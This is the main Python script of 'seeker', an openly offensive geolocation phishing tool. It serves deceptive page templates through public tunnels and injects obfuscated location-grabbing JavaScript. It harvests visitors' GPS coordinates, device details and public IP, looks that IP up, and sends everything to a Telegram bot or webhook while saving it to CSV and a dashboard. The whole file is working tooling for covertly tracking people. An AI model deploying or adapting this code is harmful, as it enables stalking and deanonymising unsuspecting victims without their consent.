#!/usr/bin/env python3

VERSION = '2.0.0'

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
Y = '\033[33m'  # yellow

import sys
import utils
import argparse
import requests
import traceback
import shutil
import atexit
import signal
from time import sleep, time
from os import path, mkdir, getenv, environ
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument(
    '-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]'
)
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')
parser.add_argument(
    '-t',
    '--template',
    type=int,
    help='Load template and loads parameters from env variables',
)
parser.add_argument(
    '-d',
    '--debugHTTP',
    type=bool,
    default=False,
    help='Disable HTTPS redirection for testing only',
)
parser.add_argument(
    '-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]'
)
parser.add_argument(
    '-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]'
)
parser.add_argument(
    '--tunnel',
    choices=['cloudflare', 'ngrok', 'localhost.run', 'serveo', 'none'],
    default='cloudflare',
    help='Tunnel provider [ Default : cloudflare ]',
)
parser.add_argument(
    '--no-tunnel',
    action='store_true',
    help='Disable tunneling (local access only)',
)

args = parser.parse_args()
kml_fname = args.kml
port = int(getenv('PORT') or args.port)
chk_upd = args.update
print_v = args.version
telegram = getenv('TELEGRAM') or args.telegram
webhook = getenv('WEBHOOK') or args.webhook
tunnel_provider = 'none' if args.no_tunnel else (getenv('TUNNEL') or args.tunnel)

if (
    getenv('DEBUG_HTTP')
    and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')
) or args.debugHTTP is True:
    environ['DEBUG_HTTP'] = '1'
else:
    environ['DEBUG_HTTP'] = '0'

templateNum = (
    int(getenv('TEMPLATE'))
    if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric()
    else args.template
)

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
DATA_FILE = f'{DB_DIR}/results.csv'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'

if not path.isdir(LOG_DIR):
    mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
    mkdir(DB_DIR)

# Global state for cleanup
_http_server = None
_tunnel_process = None
_session_manager = None
_tunnel_url = None


def chk_update():
    try:
        print('> Fetching Metadata...', end='')
        rqst = requests.get(META_URL, timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            print('OK')
            metadata = rqst.text
            json_data = loads(metadata)
            gh_version = json_data['version']
            if version.parse(gh_version) > version.parse(VERSION):
                print(f'> New Update Available : {gh_version}')
            else:
                print('> Already up to date.')
    except Exception as exc:
        utils.print(f'Exception : {str(exc)}')


if chk_upd is True:
    chk_update()
    sys.exit()

if print_v is True:
    utils.print(VERSION)
    sys.exit()

import socket
import importlib
from csv import writer as csv_writer
from ipaddress import ip_address


def validate_environment():
    import importlib.util
    issues = []

    # Check Python version
    if sys.version_info < (3, 7):
        issues.append('Python 3.7+ is required')

    # Check port availability
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.bind(('0.0.0.0', port))
        except OSError:
            issues.append(f'Port {port} is already in use')

    # Check tunnel binary
    if tunnel_provider == 'cloudflare':
        import shutil as sh
        if not sh.which('cloudflared'):
            issues.append('cloudflared not found. Install: brew install cloudflared (macOS) or download from https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/')
    elif tunnel_provider == 'ngrok':
        import shutil as sh
        if not sh.which('ngrok'):
            issues.append('ngrok not found. Install: brew install ngrok')
    elif tunnel_provider == 'localhost.run':
        import shutil as sh
        if not sh.which('ssh'):
            issues.append('ssh not found')

    return issues


def banner():
    with open(META_FILE, 'r') as metadata:
        json_data = loads(metadata.read())
        twitter_url = json_data['twitter']
        comms_url = json_data['comms']

    art = r"""
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
     \/      \/     \/      \/     \/"""
    utils.print(f'{G}{art}{W}\n')
    utils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
    utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
    utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
    utils.print(f'{G}[>] {C}Version      : {W}{VERSION} (Improved){W}\n')


def send_webhook(content, msg_type):
    if webhook is not None:
        try:
            if not webhook.lower().startswith('http://') and not webhook.lower().startswith(
                'https://'
            ):
                utils.print(f'{R}[-] {C}Protocol missing, include http:// or https://{W}')
                return
            if webhook.lower().startswith('https://discord.com/api/webhooks'):
                from discord_webhook import discord_sender
                discord_sender(webhook, msg_type, content)
            else:
                requests.post(webhook, json=content, timeout=10)
        except Exception as e:
            utils.print(f'{Y}[!] Webhook error: {e}{W}')


def send_telegram(content, msg_type):
    if telegram is not None:
        try:
            tmpsplit = telegram.split(':')
            if len(tmpsplit) < 3:
                utils.print(
                    f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}'
                )
                return
            from telegram_api import tgram_sender
            tgram_sender(msg_type, content, tmpsplit)
        except Exception as e:
            utils.print(f'{Y}[!] Telegram error: {e}{W}')


def template_select(site):
    utils.print(f'{Y}[!] Select a Template :{W}\n')

    with open(TEMPLATES_JSON, 'r') as templ:
        templ_info = templ.read()

    templ_json = loads(templ_info)

    for item in templ_json['templates']:
        name = item['name']
        utils.print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')

    try:
        selected = -1
        if templateNum is not None:
            if templateNum >= 0 and templateNum < len(templ_json['templates']):
                selected = templateNum
        else:
            selected = int(input(f'{G}[>] {W}'))
        if selected < 0:
            print()
            utils.print(f'{R}[-] {C}Invalid Input!{W}')
            sys.exit()
    except ValueError:
        print()
        utils.print(f'{R}[-] {C}Invalid Input!{W}')
        sys.exit()

    try:
        site = templ_json['templates'][selected]['dir_name']
    except IndexError:
        print()
        utils.print(f'{R}[-] {C}Invalid Input!{W}')
        sys.exit()

    print()
    utils.print(
        f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}'
    )

    imp_file = templ_json['templates'][selected]['import_file']
    importlib.import_module(f'template.{imp_file}')

    # Copy JS file (obfuscated if available)
    jsdir = f'template/{templ_json["templates"][selected]["dir_name"]}/js'
    if not path.isdir(jsdir):
        mkdir(jsdir)

    # Try to generate obfuscated JS
    try:
        from obfuscate import obfuscate_js
        obfuscate_js('js/location.js', jsdir + '/location.js')
    except Exception:
        shutil.copyfile('js/location.js', jsdir + '/location.js')

    return site


def start_server():
    from session import SessionManager
    from server import create_server

    global _http_server, _session_manager

    _session_manager = SessionManager()

    utils.print(f'{G}[+] {C}Port : {W}{port}\n')
    utils.print(f'{G}[+] {C}Starting HTTP Server...{W}', end='')

    template_dir = path.join(path_to_script, f'template/{SITE}')
    if not path.isdir(template_dir):
        utils.print(f'{C}[ {R}FAILED{C} ]{W}')
        utils.print(f'{R}[-] {C}Template directory not found: {template_dir}{W}')
        sys.exit(1)

    # Build config for dashboard API
    redirect_url = getenv('REDIRECT', 'https://news.google.com/')
    server_config = {
        'template': SITE,
        'port': port,
        'tunnel': tunnel_provider,
        'redirect': redirect_url,
        'local_url': f'http://127.0.0.1:{port}',
        'public_url': '',
    }

    _http_server = create_server(port, template_dir, _session_manager, server_config)

    # Health check
    import threading
    server_thread = threading.Thread(target=_http_server.serve_forever, daemon=True)
    server_thread.start()

    sleep(1)
    try:
        rqst = requests.get(f'http://127.0.0.1:{port}/health', timeout=5)
        if rqst.status_code == 200:
            utils.print(f'{C}[ {G}OK{C} ]{W}')
        else:
            utils.print(f'{C}[ {R}Status: {rqst.status_code}{C} ]{W}')
            cleanup()
            sys.exit(1)
    except requests.ConnectionError:
        utils.print(f'{C}[ {R}FAILED{C} ]{W}')
        cleanup()
        sys.exit(1)

    return _session_manager


def start_tunnel():
    global _tunnel_process, _tunnel_url

    if tunnel_provider == 'none':
        utils.print(f'\n{G}[+] {C}Tunnel: {W}Disabled (local only)')
        utils.print(f'{G}[+] {C}Local URL: {W}http://127.0.0.1:{port}\n')
        return

    from tunnel import start_tunnel as _start_tunnel

    utils.print(f'{G}[+] {C}Starting {Y}{tunnel_provider} {C}tunnel...{W}', end='')

    try:
        tunnel_url, proc = _start_tunnel(tunnel_provider, port)
        _tunnel_process = proc
        _tunnel_url = tunnel_url

        if tunnel_url:
            utils.print(f'{C}[ {G}OK{C} ]{W}')
            utils.print(f'\n{G}[+] {C}Tunnel URL : {W}{tunnel_url}\n')
        else:
            utils.print(f'{C}[ {R}FAILED{C} ]{W}')
            utils.print(f'{Y}[!] Continuing without tunnel. Local URL: http://127.0.0.1:{port}{W}\n')
    except Exception as e:
        utils.print(f'{C}[ {R}FAILED{C} ]{W}')
        utils.print(f'{Y}[!] Tunnel error: {e}{W}')
        utils.print(f'{Y}[!] Continuing without tunnel. Local URL: http://127.0.0.1:{port}{W}\n')


def on_session_update(event_type, session):
    """Callback for session manager updates."""
    if event_type == 'info':
        handle_device_info(session)
    elif event_type == 'location':
        handle_location(session)
    elif event_type == 'error':
        handle_error(session)


def handle_device_info(session):
    info = session.info
    if not info:
        return

    var_os = info.get('os', 'Not Available')
    var_platform = info.get('platform', 'Not Available')
    var_cores = info.get('cores', 'Not Available')
    var_ram = info.get('ram', 'Not Available')
    var_vendor = info.get('vendor', 'Not Available')
    var_render = info.get('render', 'Not Available')
    var_res = f"{info.get('wd', '?')}x{info.get('ht', '?')}"
    var_browser = info.get('browser', 'Not Available')
    var_ip = info.get('ip', 'Not Available')

    device_info = f"""{Y}[!] Device Information :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Platform   : {W}{var_platform}
{G}[+] {C}CPU Cores  : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}GPU Vendor : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Resolution : {W}{var_res}
{G}[+] {C}Browser    : {W}{var_browser}
{G}[+] {C}Public IP  : {W}{var_ip}
"""
    utils.print(device_info)
    send_telegram(info, 'device_info')
    send_webhook(info, 'device_info')

    # IP recon
    if ip_address(var_ip).is_private:
        utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
    else:
        try:
            rqst = requests.get(f'https://ipwhois.app/json/{var_ip}', timeout=10)
            if rqst.status_code == 200:
                data = rqst.json()
                var_continent = str(data.get('continent', 'N/A'))
                var_country = str(data.get('country', 'N/A'))
                var_region = str(data.get('region', 'N/A'))
                var_city = str(data.get('city', 'N/A'))
                var_org = str(data.get('org', 'N/A'))
                var_isp = str(data.get('isp', 'N/A'))

                ip_info = f"""{Y}[!] IP Information :{W}

{G}[+] {C}Continent : {W}{var_continent}
{G}[+] {C}Country   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}City      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
"""
                utils.print(ip_info)
                send_telegram(data, 'ip_info')
                send_webhook(data, 'ip_info')
        except Exception as e:
            utils.print(f'{Y}[!] IP recon failed: {e}{W}')


def handle_location(session):
    locations = session.locations
    if not locations:
        return

    loc = locations[-1]
    is_update = len(locations) > 1

    status = loc.get('status', 'failed')
    if status != 'success':
        var_err = loc.get('error', 'Unknown error')
        utils.print(f'{R}[-] {C}{var_err}\n')
        send_telegram(loc, 'error')
        send_webhook(loc, 'error')
        return

    var_lat = loc.get('lat', 'Not Available')
    var_lon = loc.get('lon', 'Not Available')
    var_acc = loc.get('acc', 'Not Available')
    var_alt = loc.get('alt', 'Not Available')
    var_dir = loc.get('dir', 'Not Available')
    var_spd = loc.get('spd', 'Not Available')

    if is_update:
        utils.print(f'{G}[+] {C}Location Update #{len(locations)}: {W}{var_lat}, {var_lon} (accuracy: {var_acc}){W}')
    else:
        loc_info = f"""{Y}[!] Location Information :{W}

{G}[+] {C}Latitude  : {W}{var_lat}
{G}[+] {C}Longitude : {W}{var_lon}
{G}[+] {C}Accuracy  : {W}{var_acc}
{G}[+] {C}Altitude  : {W}{var_alt}
{G}[+] {C}Direction : {W}{var_dir}
{G}[+] {C}Speed     : {W}{var_spd}
"""
        utils.print(loc_info)

    send_telegram(loc, 'location')
    send_webhook(loc, 'location')

    gmaps_url = f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
    gmaps_json = {'url': gmaps_url}

    if is_update:
        utils.print(f'{G}[+] {C}Google Maps : {W}{gmaps_url}\n')
    else:
        utils.print(f'{G}[+] {C}Google Maps : {W}{gmaps_url}')
        send_telegram(gmaps_json, 'url')
        send_webhook(gmaps_json, 'url')

    # CSV output
    data_row = []
    if session.info:
        info = session.info
        data_row.extend([
            info.get('os', ''), info.get('platform', ''), info.get('cores', ''),
            info.get('ram', ''), info.get('vendor', ''), info.get('render', ''),
            f"{info.get('wd', '')}x{info.get('ht', '')}", info.get('browser', ''),
            info.get('ip', ''),
        ])
    data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
    csvout(data_row)

    # KML output (first location only)
    if kml_fname is not None and not is_update:
        kmlout(var_lat, var_lon)

    if not is_update:
        print()


def handle_error(session):
    utils.print(f'{R}[-] {C}Geolocation error from {session.ip}{W}\n')


def wait_for_clients(session_manager):
    """Main loop - wait for incoming data via session callbacks."""
    utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')

    # Register callback
    session_manager.on_update(on_session_update)

    # Block until interrupted
    try:
        while True:
            sleep(1)
    except KeyboardInterrupt:
        raise


def kmlout(var_lat, var_lon):
    with open(TEMP_KML, 'r') as kml_sample:
        kml_sample_data = kml_sample.read()

    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

    with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
        kml_gen.write(kml_sample_data)

    utils.print(f'{Y}[!] KML File Generated!{W}')
    utils.print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
    with open(DATA_FILE, 'a') as csvfile:
        csvw = csv_writer(csvfile)
        csvw.writerow(row)
    utils.print(f'{G}[+] {C}Data Saved : {W}{DATA_FILE}\n')


def cleanup():
    """Clean up all resources."""
    global _http_server, _tunnel_process

    if _http_server:
        try:
            _http_server.shutdown()
        except Exception:
            pass

    if _tunnel_process:
        try:
            _tunnel_process.terminate()
            _tunnel_process.wait(timeout=5)
        except Exception:
            try:
                _tunnel_process.kill()
            except Exception:
                pass


def signal_handler(signum, frame):
    utils.print(f'\n{R}[-] {C}Shutting down...{W}')
    cleanup()
    sys.exit(0)


def main():
    global _tunnel_url

    # Register cleanup handlers
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Validate environment
    issues = validate_environment()
    if issues:
        for issue in issues:
            utils.print(f'{R}[-] {C}{issue}{W}')
        sys.exit(1)

    global SITE
    banner()
    SITE = template_select(SITE)
    session_manager = start_server()
    start_tunnel()

    # Update config with tunnel URL
    if _http_server and hasattr(_http_server, 'RequestHandlerClass'):
        cfg = _http_server.RequestHandlerClass._config
        if cfg and _tunnel_url:
            cfg['public_url'] = _tunnel_url

    # Print dashboard URL
    local_dash = f'http://127.0.0.1:{port}/dashboard'
    utils.print(f'{G}[+] {C}Dashboard : {W}{local_dash}')
    if _tunnel_url:
        utils.print(f'{G}[+] {C}Dashboard (Public) : {W}{_tunnel_url}/dashboard')
    print()

    wait_for_clients(session_manager)


try:
    main()
except KeyboardInterrupt:
    utils.print(f'\n{R}[-] {C}Keyboard Interrupt.{W}')
    cleanup()
